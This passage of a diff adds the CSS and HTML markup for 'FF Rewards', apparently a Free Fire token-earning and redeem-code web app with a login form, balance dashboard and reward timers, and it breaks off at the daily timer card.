@@ -1,0 +1,1244 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+<title>FF Rewards — Free Fire Earn & Redeem</title>
+<link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@400;500;600;700&family=Orbitron:wght@400;600;700;900&family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --orange:#FF6B00;--gold:#FFD700;--navy:#0A0E1A;--navy2:#0F1422;--navy3:#151c30;
+  --card:#131929;--card2:#1a2238;--border:#ffffff12;--border2:#ffffff20;
+  --text:#e8eaf6;--text2:#8b94b0;--text3:#5a6380;
+  --success:#00e676;--danger:#ff1744;
+  --ff1:#FF6B00;--ff2:#FFD700;
+  --radius:14px;--radius-sm:8px;--radius-lg:20px;
+}
+html,body{height:100%;background:var(--navy);color:var(--text);font-family:'Inter',sans-serif;overflow-x:hidden}
+
+/* ─── SPLASH ─── */
+#splash{position:fixed;inset:0;background:var(--navy);z-index:9999;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:20px}
+.splash-logo{font-family:'Orbitron',monospace;font-size:42px;font-weight:900;background:linear-gradient(135deg,var(--ff1),var(--ff2));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;letter-spacing:4px;animation:pulseLogo 1s ease-in-out infinite alternate}
+.splash-sub{font-family:'Rajdhani',sans-serif;font-size:16px;letter-spacing:8px;color:var(--text2);text-transform:uppercase}
+.splash-ring{width:60px;height:60px;border:3px solid var(--border2);border-top-color:var(--ff1);border-radius:50%;animation:spin 0.8s linear infinite}
+@keyframes pulseLogo{from{opacity:0.7}to{opacity:1}}
+@keyframes spin{to{transform:rotate(360deg)}}
+#splash.hide{animation:fadeOut 0.4s ease forwards}
+@keyframes fadeOut{to{opacity:0;pointer-events:none}}
+
+/* ─── APP WRAPPER ─── */
+#app{display:none;flex-direction:column;min-height:100vh;max-width:480px;margin:0 auto;position:relative}
+#app.show{display:flex}
+
+/* ─── LOGIN ─── */
+#login-screen{position:fixed;inset:0;background:var(--navy);z-index:100;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:24px;overflow-y:auto}
+#login-screen.hide{display:none}
+.login-logo{font-family:'Orbitron',monospace;font-size:36px;font-weight:900;background:linear-gradient(135deg,var(--ff1),var(--ff2));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;letter-spacing:3px;text-align:center;margin-bottom:4px}
+.login-tagline{font-family:'Rajdhani',sans-serif;color:var(--text2);letter-spacing:5px;font-size:12px;text-transform:uppercase;text-align:center;margin-bottom:32px}
+.login-card{background:var(--card);border:1px solid var(--border2);border-radius:var(--radius-lg);padding:28px 24px;width:100%;max-width:380px}
+.login-title{font-family:'Rajdhani',sans-serif;font-size:20px;font-weight:700;color:var(--text);margin-bottom:6px;letter-spacing:1px}
+.login-desc{font-size:13px;color:var(--text2);margin-bottom:24px;line-height:1.5}
+.form-group{margin-bottom:18px}
+.form-label{display:block;font-size:12px;font-weight:500;color:var(--text2);text-transform:uppercase;letter-spacing:1px;margin-bottom:8px}
+.form-input{width:100%;background:var(--navy2);border:1px solid var(--border2);border-radius:var(--radius-sm);padding:13px 16px;color:var(--text);font-size:15px;font-family:'Inter',sans-serif;outline:none;transition:border-color 0.2s,box-shadow 0.2s}
+.form-input:focus{border-color:var(--ff1);box-shadow:0 0 0 3px rgba(255,107,0,0.15)}
+.form-input::placeholder{color:var(--text3)}
+.btn-primary{width:100%;background:linear-gradient(135deg,var(--ff1),#ff8c00);border:none;border-radius:var(--radius-sm);padding:15px;color:#fff;font-size:16px;font-family:'Rajdhani',sans-serif;font-weight:700;letter-spacing:2px;text-transform:uppercase;cursor:pointer;transition:transform 0.15s,box-shadow 0.15s;position:relative;overflow:hidden}
+.btn-primary:hover{transform:translateY(-1px);box-shadow:0 6px 24px rgba(255,107,0,0.4)}
+.btn-primary:active{transform:translateY(0)}
+.btn-primary:disabled{opacity:0.6;cursor:not-allowed;transform:none}
+.btn-primary::after{content:'';position:absolute;inset:0;background:linear-gradient(135deg,rgba(255,255,255,0.1),transparent);pointer-events:none}
+.form-error{color:#ff6b6b;font-size:12px;margin-top:6px;display:none}
+
+/* ─── TOP HEADER ─── */
+#top-header{background:var(--card);border-bottom:1px solid var(--border);padding:14px 20px;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:50;flex-shrink:0}
+.header-logo{font-family:'Orbitron',monospace;font-size:18px;font-weight:700;background:linear-gradient(135deg,var(--ff1),var(--ff2));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;letter-spacing:2px}
+.header-balance{display:flex;align-items:center;gap:8px;background:var(--navy);border:1px solid var(--border2);border-radius:100px;padding:6px 14px}
+.header-coin{width:20px;height:20px;background:linear-gradient(135deg,var(--ff1),var(--ff2));border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:10px;font-weight:700;color:var(--navy);flex-shrink:0}
+.header-bal-num{font-family:'Rajdhani',sans-serif;font-size:16px;font-weight:700;color:var(--gold)}
+
+/* ─── MAIN CONTENT ─── */
+#main-content{flex:1;overflow-y:auto;padding-bottom:80px}
+.tab-section{display:none;padding:20px;animation:fadeIn 0.25s ease}
+.tab-section.active{display:block}
+@keyframes fadeIn{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}
+
+/* ─── BOTTOM NAV ─── */
+#bottom-nav{position:fixed;bottom:0;left:50%;transform:translateX(-50%);width:100%;max-width:480px;background:var(--card);border-top:1px solid var(--border2);display:flex;z-index:50;padding:0 4px}
+.nav-item{flex:1;display:flex;flex-direction:column;align-items:center;gap:3px;padding:12px 6px 10px;cursor:pointer;transition:color 0.2s;border:none;background:transparent;color:var(--text2);font-size:11px;font-family:'Inter',sans-serif;position:relative}
+.nav-item svg{width:22px;height:22px;stroke:currentColor;fill:none;stroke-width:1.8;stroke-linecap:round;stroke-linejoin:round;transition:stroke 0.2s}
+.nav-item.active{color:var(--ff1)}
+.nav-item.active svg{stroke:var(--ff1)}
+.nav-item .nav-dot{width:4px;height:4px;background:var(--ff1);border-radius:50%;position:absolute;bottom:6px;opacity:0;transition:opacity 0.2s}
+.nav-item.active .nav-dot{opacity:1}
+
+/* ─── CARDS ─── */
+.card{background:var(--card);border:1px solid var(--border);border-radius:var(--radius);padding:20px;margin-bottom:16px}
+.card-accent{border-left:3px solid var(--ff1)}
+.section-title{font-family:'Rajdhani',sans-serif;font-size:11px;font-weight:600;color:var(--text2);letter-spacing:3px;text-transform:uppercase;margin-bottom:16px}
+
+/* ─── DASHBOARD ─── */
+.welcome-text{font-family:'Rajdhani',sans-serif;font-size:22px;font-weight:700;color:var(--text);margin-bottom:4px}
+.welcome-sub{font-size:13px;color:var(--text2);margin-bottom:24px}
+.balance-display{text-align:center;padding:28px 20px;background:linear-gradient(135deg,rgba(255,107,0,0.08),rgba(255,215,0,0.04));border:1px solid rgba(255,107,0,0.2);border-radius:var(--radius-lg);margin-bottom:16px;position:relative;overflow:hidden}
+.balance-display::before{content:'';position:absolute;top:-50%;right:-20%;width:200px;height:200px;background:radial-gradient(circle,rgba(255,107,0,0.08),transparent 70%);pointer-events:none}
+.balance-label{font-size:12px;color:var(--text2);letter-spacing:2px;text-transform:uppercase;margin-bottom:6px}
+.balance-amount{font-family:'Orbitron',monospace;font-size:52px;font-weight:900;background:linear-gradient(135deg,var(--ff1),var(--ff2));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;line-height:1;margin-bottom:4px}
+.balance-unit{font-size:13px;color:var(--text2);letter-spacing:1px}
+.progress-section{margin-bottom:6px}
+.progress-label{display:flex;justify-content:space-between;font-size:12px;color:var(--text2);margin-bottom:8px}
+.progress-bar-track{height:8px;background:var(--navy2);border-radius:100px;overflow:hidden}
+.progress-bar-fill{height:100%;background:linear-gradient(90deg,var(--ff1),var(--ff2));border-radius:100px;transition:width 0.6s cubic-bezier(0.4,0,0.2,1)}
+.progress-hint{font-size:11px;color:var(--text3);margin-top:6px}
+.next-timer-card{background:var(--navy2);border-radius:var(--radius-sm);padding:14px 16px;margin-bottom:16px;display:flex;align-items:center;justify-content:space-between}
+.next-timer-info .label{font-size:11px;color:var(--text2);letter-spacing:1px;text-transform:uppercase}
+.next-timer-info .time{font-family:'Orbitron',monospace;font-size:20px;font-weight:700;color:var(--ff2)}
+.btn-go-earn{display:block;text-align:center;background:linear-gradient(135deg,var(--ff1),#ff8c00);border:none;border-radius:var(--radius-sm);padding:14px;color:#fff;font-size:15px;font-family:'Rajdhani',sans-serif;font-weight:700;letter-spacing:2px;text-transform:uppercase;cursor:pointer;transition:transform 0.15s,box-shadow 0.15s;width:100%}
+.btn-go-earn:hover{transform:translateY(-1px);box-shadow:0 6px 24px rgba(255,107,0,0.4)}
+
+/* ─── EARN TIMERS ─── */
+.timer-card{background:var(--card);border:1px solid var(--border);border-radius:var(--radius-lg);padding:24px 20px;margin-bottom:16px;text-align:center;position:relative;overflow:hidden}
+.timer-card::before{content:'';position:absolute;inset:0;background:radial-gradient(ellipse at top,rgba(255,107,0,0.05),transparent 60%);pointer-events:none}
+.timer-badge{display:inline-block;font-size:10px;letter-spacing:2px;text-transform:uppercase;padding:4px 12px;border-radius:100px;margin-bottom:12px;font-weight:600}
+.timer-badge.daily{background:rgba(255,107,0,0.15);color:var(--ff1);border:1px solid rgba(255,107,0,0.3)}
+.timer-badge.weekly{background:rgba(255,215,0,0.1);color:var(--ff2);border:1px solid rgba(255,215,0,0.25)}
+.timer-title{font-family:'Rajdhani',sans-serif;font-size:18px;font-weight:700;margin-bottom:4px}
+.timer-reward{font-size:13px;color:var(--text2);margin-bottom:20px}
+.timer-reward span{color:var(--ff2);font-weight:600}
+.ring-wrap{position:relative;width:140px;height:140px;margin:0 auto 20px}
+.ring-svg{transform:rotate(-90deg)}
+.ring-track{fill:none;stroke:var(--navy2);stroke-width:8}
+.ring-fill-daily{fill:none;stroke:url(#ring-grad-daily);stroke-width:8;stroke-linecap:round;transition:stroke-dashoffset 1s linear}
+.ring-fill-weekly{fill:none;stroke:url(#ring-grad-weekly);stroke-width:8;stroke-linecap:round;transition:stroke-dashoffset 1s linear}
+.ring-center{position:absolute;inset:0;display:flex;flex-direction:column;align-items:center;justify-content:center}
+.ring-time{font-family:'Orbitron',monospace;font-size:17px;font-weight:700;line-height:1}
+.ring-label{font-size:10px;color:var(--text2);margin-top:3px;letter-spacing:1px;text-transform:uppercase}
+.btn-claim{background:linear-gradient(135deg,var(--ff1),#ff8c00);border:none;border-radius:var(--radius-sm);padding:13px 32px;color:#fff;font-size:15px;font-family:'Rajdhani',sans-serif;font-weight:700;letter-spacing:2px;text-transform:uppercase;cursor:pointer;transition:transform 0.15s,box-shadow 0.15s;animation:claimPulse 1.5s ease-in-out infinite}
+@keyframes claimPulse{0%,100%{box-shadow:0 0 0 0 rgba(255,107,0,0.5)}50%{box-shadow:0 0 0 12px rgba(255,107,0,0)}}
+.btn-claim:hover{transform:scale(1.04)}
+.btn-claim-weekly{background:linear-gradient(135deg,#c8a800,var(--ff2))}
+@keyframes claimPulseW{0%,100%{box-shadow:0 0 0 0 rgba(255,215,0,0.4)}50%{box-shadow:0 0 0 12px rgba(255,215,0,0)}}
+.btn-claim-weekly{animation:claimPulseW 1.5s ease-in-out infinite}
+.btn-start{background:var(--navy2);border:2px solid var(--ff1);border-radius:var(--radius-sm);padding:13px 32px;color:var(--ff1);font-size:15px;font-family:'Rajdhani',sans-serif;font-weight:700;letter-spacing:2px;text-transform:uppercase;cursor:pointer;transition:background 0.2s,transform 0.15s}
+.btn-start:hover{background:rgba(255,107,0,0.12);transform:scale(1.03)}
+.btn-start-weekly{border-color:var(--ff2);color:var(--ff2)}
+.btn-start-weekly:hover{background:rgba(255,215,0,0.1)}
+.btn-countdown{background:var(--navy2);border:1px solid var(--border2);border-radius:var(--radius-sm);padding:13px 32px;color:var(--text2);font-size:14px;font-family:'Rajdhani',sans-serif;font-weight:600;letter-spacing:1px;cursor:not-allowed;text-transform:uppercase}
+
+/* ─── CASHOUT ─── */
+.cashout-locked{text-align:center;padding:32px 16px}
+.lock-icon{font-size:48px;margin-bottom:12px;opacity:0.5}
+.cashout-lock-title{font-family:'Rajdhani',sans-serif;font-size:18px;font-weight:700;margin-bottom:8px}
+.cashout-lock-desc{font-size:13px;color:var(--text2);line-height:1.5;margin-bottom:20px}
+.cashout-options{display:flex;flex-direction:column;gap:14px;margin-bottom:20px}
+.cashout-option-card{background:var(--card2);border:2px solid var(--border);border-radius:var(--radius);padding:20px;cursor:pointer;transition:border-color 0.2s,transform 0.15s;position:relative}
+.cashout-option-card:hover{border-color:rgba(255,107,0,0.4);transform:translateY(-2px)}
+.cashout-option-card.selected{border-color:var(--ff1);background:rgba(255,107,0,0.05)}
+.cashout-option-card .check{position:absolute;top:16px;right:16px;width:22px;height:22px;border:2px solid var(--border2);border-radius:50%;display:flex;align-items:center;justify-content:center;transition:all 0.2s}
+.cashout-option-card.selected .check{background:var(--ff1);border-color:var(--ff1)}
+.cashout-option-card.selected .check::after{content:'✓';color:#fff;font-size:12px;font-weight:700}
+.option-header{display:flex;align-items:center;gap:12px;margin-bottom:10px}
+.option-icon{width:44px;height:44px;border-radius:var(--radius-sm);display:flex;align-items:center;justify-content:center;font-size:22px;flex-shrink:0}
+.option-icon.play{background:rgba(1,135,75,0.2);border:1px solid rgba(1,135,75,0.3)}
+.option-icon.diamond{background:rgba(0,168,255,0.15);border:1px solid rgba(0,168,255,0.25)}
+.option-name{font-family:'Rajdhani',sans-serif;font-size:17px;font-weight:700}
+.option-cost{font-size:12px;color:var(--text2);margin-top:2px}
+.option-cost span{color:var(--ff2);font-weight:600}
+.option-desc{font-size:13px;color:var(--text2);line-height:1.4}
+.btn-redeem{width:100%;background:linear-gradient(135deg,var(--ff1),#ff8c00);border:none;border-radius:var(--radius-sm);padding:15px;color:#fff;font-size:16px;font-family:'Rajdhani',sans-serif;font-weight:700;letter-spacing:2px;text-transform:uppercase;cursor:pointer;transition:transform 0.15s,box-shadow 0.15s,opacity 0.2s}
+.btn-redeem:hover:not(:disabled){transform:translateY(-1px);box-shadow:0 6px 24px rgba(255,107,0,0.4)}
+.btn-redeem:disabled{opacity:0.4;cursor:not-allowed}
+
+/* ─── PROFILE ─── */
+.avatar-wrap{display:flex;flex-direction:column;align-items:center;margin-bottom:24px}
+.avatar{width:72px;height:72px;border-radius:50%;background:linear-gradient(135deg,var(--ff1),var(--ff2));display:flex;align-items:center;justify-content:center;font-family:'Orbitron',monospace;font-size:24px;font-weight:900;color:var(--navy);margin-bottom:8px;border:3px solid rgba(255,107,0,0.3);box-shadow:0 0 0 6px rgba(255,107,0,0.08)}
+.avatar-name{font-family:'Rajdhani',sans-serif;font-size:18px;font-weight:700}
+.avatar-uid{font-size:12px;color:var(--text2);letter-spacing:1px}
+.profile-field{display:flex;align-items:center;justify-content:space-between;padding:14px 0;border-bottom:1px solid var(--border)}
+.profile-field:last-of-type{border-bottom:none}
+.field-info .field-label{font-size:11px;color:var(--text3);text-transform:uppercase;letter-spacing:1px;margin-bottom:3px}
+.field-info .field-value{font-size:15px;font-weight:500}
+.btn-edit{background:rgba(255,107,0,0.1);border:1px solid rgba(255,107,0,0.3);border-radius:var(--radius-sm);padding:7px 16px;color:var(--ff1);font-size:13px;font-family:'Rajdhani',sans-serif;font-weight:600;cursor:pointer;letter-spacing:1px;transition:background 0.2s}
+.btn-edit:hover{background:rgba(255,107,0,0.2)}
+.edit-form{background:var(--navy2);border:1px solid var(--border2);border-radius:var(--radius);padding:20px;margin-top:16px}
+.edit-form-title{font-family:'Rajdhani',sans-serif;font-size:15px;font-weight:700;margin-bottom:16px;color:var(--text)}
+.edit-actions{display:flex;gap:10px;margin-top:16px}
+.btn-save{flex:1;background:linear-gradient(135deg,var(--ff1),#ff8c00);border:none;border-radius:var(--radius-sm);padding:12px;color:#fff;font-size:14px;font-family:'Rajdhani',sans-serif;font-weight:700;letter-spacing:1px;cursor:pointer;transition:opacity 0.2s}
+.btn-save:hover{opacity:0.9}
+.btn-cancel{flex:1;background:var(--navy);border:1px solid var(--border2);border-radius:var(--radius-sm);padding:12px;color:var(--text2);font-size:14px;font-family:'Rajdhani',sans-serif;font-weight:600;letter-spacing:1px;cursor:pointer}
+
+/* ─── HISTORY ─── */
+.history-empty{text-align:center;padding:48px 16px;color:var(--text2)}
+.history-empty-icon{font-size:40px;margin-bottom:12px;opacity:0.3}
+.history-list{display:flex;flex-direction:column;gap:10px}
+.history-item{background:var(--card);border:1px solid var(--border);border-radius:var(--radius);padding:14px 16px;display:flex;align-items:center;gap:14px;animation:slideIn 0.3s ease}
+@keyframes slideIn{from{opacity:0;transform:translateX(-10px)}to{opacity:1;transform:translateX(0)}}
+.h-icon{width:38px;height:38px;border-radius:var(--radius-sm);display:flex;align-items:center;justify-content:center;font-size:18px;flex-shrink:0}
+.h-icon.earn{background:rgba(0,230,118,0.1);border:1px solid rgba(0,230,118,0.2)}
+.h-icon.cashout{background:rgba(255,107,0,0.1);border:1px solid rgba(255,107,0,0.2)}
+.h-info{flex:1;min-width:0}
+.h-desc{font-size:14px;font-weight:500;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.h-time{font-size:11px;color:var(--text3);margin-top:2px}
+.h-amount{font-family:'Rajdhani',sans-serif;font-size:16px;font-weight:700;flex-shrink:0}
+.h-amount.pos{color:var(--success)}
+.h-amount.neg{color:var(--ff1)}
+
+/* ─── MODAL ─── */
+#modal-overlay{position:fixed;inset:0;background:rgba(0,0,0,0.7);z-index:200;display:none;align-items:flex-end;justify-content:center;padding:20px;backdrop-filter:blur(4px)}
+#modal-overlay.show{display:flex}
+.modal-box{background:var(--card);border:1px solid var(--border2);border-radius:var(--radius-lg) var(--radius-lg) var(--radius) var(--radius);padding:28px 24px;width:100%;max-width:440px;animation:slideUp 0.3s cubic-bezier(0.34,1.56,0.64,1)}
+@keyframes slideUp{from{transform:translateY(60px);opacity:0}to{transform:translateY(0);opacity:1}}
+.modal-title{font-family:'Rajdhani',sans-serif;font-size:20px;font-weight:700;margin-bottom:8px}
+.modal-body{font-size:14px;color:var(--text2);line-height:1.6;margin-bottom:24px}
+.modal-highlight{color:var(--ff1);font-weight:600}
+.modal-actions{display:flex;gap:10px}
+.btn-confirm{flex:1;background:linear-gradient(135deg,var(--ff1),#ff8c00);border:none;border-radius:var(--radius-sm);padding:14px;color:#fff;font-size:15px;font-family:'Rajdhani',sans-serif;font-weight:700;letter-spacing:1px;cursor:pointer}
+.btn-modal-cancel{flex:1;background:var(--navy2);border:1px solid var(--border2);border-radius:var(--radius-sm);padding:14px;color:var(--text2);font-size:15px;font-family:'Rajdhani',sans-serif;font-weight:600;cursor:pointer}
+
+/* ─── TOAST ─── */
+#toast{position:fixed;top:80px;left:50%;transform:translateX(-50%) translateY(-20px);background:var(--card2);border:1px solid var(--border2);border-radius:100px;padding:12px 24px;font-size:14px;font-weight:500;z-index:300;opacity:0;transition:all 0.35s cubic-bezier(0.34,1.56,0.64,1);pointer-events:none;white-space:nowrap;max-width:90vw;text-align:center}
+#toast.success{border-color:rgba(0,230,118,0.4);color:var(--success)}
+#toast.error{border-color:rgba(255,107,0,0.4);color:var(--ff1)}
+#toast.info{border-color:rgba(255,215,0,0.3);color:var(--ff2)}
+#toast.show{opacity:1;transform:translateX(-50%) translateY(0)}
+
+/* ─── COIN BURST ─── */
+.coin-burst{position:fixed;pointer-events:none;z-index:400}
+.coin-particle{position:absolute;font-size:20px;animation:burstCoin 1s ease-out forwards}
+@keyframes burstCoin{0%{transform:translate(0,0) scale(1);opacity:1}100%{transform:translate(var(--tx),var(--ty)) scale(0.3);opacity:0}}
+
+/* ─── SCROLLBAR ─── */
+::-webkit-scrollbar{width:3px}
+::-webkit-scrollbar-track{background:transparent}
+::-webkit-scrollbar-thumb{background:var(--border2);border-radius:2px}
+
+/* ─── MISC ─── */
+.divider{height:1px;background:var(--border);margin:16px 0}
+.stat-row{display:flex;gap:12px;margin-bottom:16px}
+.stat-box{flex:1;background:var(--navy2);border-radius:var(--radius-sm);padding:14px;text-align:center}
+.stat-box .sval{font-family:'Rajdhani',sans-serif;font-size:22px;font-weight:700;color:var(--ff2)}
+.stat-box .slbl{font-size:11px;color:var(--text3);text-transform:uppercase;letter-spacing:1px;margin-top:2px}
+.info-banner{background:rgba(255,107,0,0.06);border:1px solid rgba(255,107,0,0.15);border-radius:var(--radius-sm);padding:12px 14px;font-size:12px;color:var(--text2);line-height:1.5;margin-bottom:16px}
+.info-banner strong{color:var(--ff1)}
+
+@media(max-width:380px){
+  .balance-amount{font-size:44px}
+  .timer-card{padding:18px 14px}
+  .ring-wrap{width:120px;height:120px}
+  .ring-time{font-size:15px}
+}
+
+/* ─── CASHOUT PRO ─── */
+.co-balance-card{background:linear-gradient(135deg,rgba(255,107,0,0.12),rgba(255,215,0,0.06));border:1px solid rgba(255,107,0,0.25);border-radius:var(--radius-lg);padding:20px 22px;display:flex;justify-content:space-between;align-items:center;margin-bottom:14px}
+.co-bal-label{font-size:10px;text-transform:uppercase;letter-spacing:1.5px;color:var(--text2);margin-bottom:4px}
+.co-bal-amount{font-family:'Orbitron',monospace;font-size:32px;font-weight:900;background:linear-gradient(135deg,var(--ff1),var(--ff2));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;line-height:1}
+.co-bal-right{text-align:right}
+.co-next-reward{font-family:'Rajdhani',sans-serif;font-size:20px;font-weight:700;color:var(--ff2)}
+.co-next-cost{font-size:11px;color:var(--text3)}
+.co-progress-wrap{margin-bottom:14px}
+.co-progress-labels{display:flex;justify-content:space-between;font-size:12px;color:var(--text2);margin-bottom:8px}
+.co-status-banner{display:flex;align-items:center;gap:10px;border-radius:var(--radius-sm);padding:11px 14px;font-size:13px;font-weight:500;margin-bottom:16px;transition:all 0.3s}
+.co-status-banner.locked{background:rgba(255,107,0,0.07);border:1px solid rgba(255,107,0,0.2);color:var(--text2)}
+.co-status-banner.unlocked{background:rgba(0,230,118,0.07);border:1px solid rgba(0,230,118,0.25);color:var(--success)}
+.co-banner-icon{font-size:16px;flex-shrink:0}
+.co-cat-tabs{display:flex;gap:8px;margin-bottom:16px;background:var(--navy2);border-radius:var(--radius-sm);padding:4px}
+.co-cat-btn{flex:1;padding:10px;border:none;border-radius:6px;background:transparent;color:var(--text2);font-family:'Rajdhani',sans-serif;font-size:14px;font-weight:600;cursor:pointer;transition:all 0.2s;letter-spacing:0.5px}
+.co-cat-btn.active{background:var(--card2);color:var(--text);box-shadow:0 2px 8px rgba(0,0,0,0.3)}
+.co-rewards-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:16px}
+.co-reward-card{background:var(--card);border:2px solid var(--border);border-radius:var(--radius);padding:16px 12px;cursor:pointer;transition:border-color 0.2s,transform 0.15s,background 0.2s;position:relative;text-align:center;overflow:hidden}
+.co-reward-card:hover{border-color:rgba(255,107,0,0.35);transform:translateY(-2px)}
+.co-reward-card.selected{border-color:var(--ff1);background:rgba(255,107,0,0.06)}
+.co-reward-card.locked-card{opacity:0.55;cursor:not-allowed}
+.co-reward-card.locked-card:hover{transform:none;border-color:var(--border)}
+.co-reward-check{position:absolute;top:10px;right:10px;width:18px;height:18px;border:2px solid var(--border2);border-radius:50%;transition:all 0.2s;background:transparent}
+.co-reward-card.selected .co-reward-check{background:var(--ff1);border-color:var(--ff1);display:flex;align-items:center;justify-content:center}
+.co-reward-card.selected .co-reward-check::after{content:"✓";color:#fff;font-size:10px;font-weight:800}
+.co-reward-badge{display:inline-block;font-size:9px;font-weight:700;letter-spacing:1.5px;padding:3px 8px;border-radius:100px;margin-bottom:8px}
+.co-reward-badge.popular{background:rgba(255,107,0,0.2);color:var(--ff1);border:1px solid rgba(255,107,0,0.35)}
+.co-reward-badge.hot{background:rgba(255,68,0,0.2);color:#ff4400;border:1px solid rgba(255,68,0,0.4)}
+.co-reward-badge.elite{background:linear-gradient(135deg,rgba(255,215,0,0.15),rgba(255,107,0,0.1));color:var(--ff2);border:1px solid rgba(255,215,0,0.3)}
+.co-reward-icon{width:44px;height:44px;border-radius:10px;display:flex;align-items:center;justify-content:center;font-size:22px;margin:0 auto 8px}
+.co-reward-name{font-size:11px;color:var(--text2);margin-bottom:2px;letter-spacing:0.5px}
+.co-reward-value{font-family:'Rajdhani',sans-serif;font-size:20px;font-weight:800;color:var(--text);line-height:1;margin-bottom:6px}
+.co-reward-tokens{margin-bottom:6px}
+.co-token-cost{font-size:11px;background:rgba(255,215,0,0.1);color:var(--ff2);padding:2px 8px;border-radius:100px;border:1px solid rgba(255,215,0,0.2)}
+.co-reward-desc{font-size:11px;color:var(--text3);line-height:1.3}
+.co-action-bar{background:linear-gradient(135deg,rgba(255,107,0,0.1),rgba(255,215,0,0.05));border:1px solid rgba(255,107,0,0.3);border-radius:var(--radius);padding:16px 18px;display:flex;align-items:center;justify-content:space-between;gap:12px;margin-bottom:8px;animation:fadeIn 0.2s ease}
+.co-action-info .co-action-name{font-family:'Rajdhani',sans-serif;font-size:16px;font-weight:700;color:var(--text)}
+.co-action-info .co-action-cost{font-size:12px;color:var(--ff2);margin-top:2px}
+.btn-redeem-new{background:linear-gradient(135deg,var(--ff1),#ff8c00);border:none;border-radius:var(--radius-sm);padding:12px 22px;color:#fff;font-size:14px;font-family:'Rajdhani',sans-serif;font-weight:700;letter-spacing:1.5px;cursor:pointer;white-space:nowrap;transition:transform 0.15s,box-shadow 0.2s;text-transform:uppercase}
+.btn-redeem-new:hover{transform:translateY(-1px);box-shadow:0 6px 20px rgba(255,107,0,0.45)}
+.co-select-hint{text-align:center;font-size:12px;color:var(--text3);padding:8px 0 4px;margin-bottom:8px}
+</style>
+</head>
+<body>
+
+<!-- SPLASH -->
+<div id="splash">
+  <div class="splash-logo">FF REWARDS</div>
+  <div class="splash-sub">Earn · Redeem · Dominate</div>
+  <div class="splash-ring"></div>
+</div>
+
+<!-- LOGIN SCREEN -->
+<div id="login-screen">
+  <div style="margin-bottom:28px;text-align:center">
+    <div class="login-logo">FF REWARDS</div>
+    <div class="login-tagline">Earn Tokens · Get Redeem Codes</div>
+  </div>
+  <div class="login-card">
+    <div class="login-title">Enter Your Details</div>
+    <div class="login-desc">Login once to start earning tokens and claim Free Fire rewards.</div>
+    <div class="form-group">
+      <label class="form-label" for="inp-name">First Name</label>
+      <input class="form-input" type="text" id="inp-name" placeholder="e.g. Riyaz" maxlength="40">
+      <div class="form-error" id="err-name">Please enter your first name.</div>
+    </div>
+    <div class="form-group">
+      <label class="form-label" for="inp-email">FF Binded Email</label>
+      <input class="form-input" type="email" id="inp-email" placeholder="e.g. riyaz@gmail.com">
+      <div class="form-error" id="err-email">Please enter a valid email.</div>
+    </div>
+    <div class="form-group">
+      <label class="form-label" for="inp-uid">Game UID</label>
+      <input class="form-input" type="number" id="inp-uid" placeholder="e.g. 123456789" min="1">
+      <div class="form-error" id="err-uid">Please enter your Game UID.</div>
+    </div>
+    <button class="btn-primary" id="btn-login" onclick="doLogin()">Enter The Arena</button>
+  </div>
+  <div style="margin-top:20px;font-size:11px;color:var(--text3);text-align:center;line-height:1.7;max-width:300px">
+    Your data is saved locally on this device only.<br>No account registration required.
+  </div>
+</div>
+
+<!-- APP -->
+<div id="app">
+  <!-- TOP HEADER -->
+  <div id="top-header">
+    <div class="header-logo">FF REWARDS</div>
+    <div class="header-balance">
+      <div class="header-coin">🪙</div>
+      <div class="header-bal-num" id="hdr-balance">0</div>
+      <div style="font-size:11px;color:var(--text2);margin-left:2px">tokens</div>
+    </div>
+  </div>
+
+  <!-- MAIN CONTENT -->
+  <div id="main-content">
+
+    <!-- HOME TAB -->
+    <div class="tab-section" id="tab-home">
+      <div class="welcome-text" id="welcome-name">Welcome back!</div>
+      <div class="welcome-sub">Your Free Fire rewards dashboard</div>
+
+      <div class="balance-display">
+        <div class="balance-label">Token Balance</div>
+        <div class="balance-amount" id="dash-balance">0</div>
+        <div class="balance-unit">TOKENS</div>
+      </div>
+
+      <div class="card">
+        <div class="section-title">Progress to ₹30 Reward</div>
+        <div class="progress-section">
+          <div class="progress-label">
+            <span id="prog-current">0 tokens</span>
+            <span>1500 tokens</span>
+          </div>
+          <div class="progress-bar-track">
+            <div class="progress-bar-fill" id="progress-fill" style="width:0%"></div>
+          </div>
+          <div class="progress-hint" id="prog-hint">Earn 1500 tokens to unlock cashout</div>
+        </div>
+      </div>
+
+      <div class="card">
+        <div class="section-title">Next Reward In</div>
+        <div class="next-timer-card">
+          <div class="next-timer-info">
+            <div class="label">Soonest Timer</div>
+            <div class="time" id="next-timer-display">--:--:--</div>
+          </div>
+          <div style="font-size:24px">⏱️</div>
+        </div>
+        <div class="stat-row">
+          <div class="stat-box">
+            <div class="sval" id="dash-daily-time">--:--</div>
+            <div class="slbl">Daily (500)</div>
+          </div>
+          <div class="stat-box">
+            <div class="sval" id="dash-weekly-time">--:--</div>
+            <div class="slbl">Weekly (1000)</div>
+          </div>
+        </div>
+        <button class="btn-go-earn" onclick="switchTab('earn')">⚡ Go Earn Tokens</button>
+      </div>
+    </div>
+
+    <!-- EARN TAB -->
+    <div class="tab-section" id="tab-earn">
+      <div class="section-title" style="margin-bottom:8px">Active Timers</div>
+      <div class="info-banner">
+        Press <strong>Start</strong> to begin a timer. Timers run only while the app is open — closing the app resets them.
+      </div>
+
+      <!-- Daily Timer -->
+      <div class="timer-card" id="daily-timer-card">
+        <div class="timer-badge daily">Daily</div>
+        <div class="timer-title">Daily Reward</div>
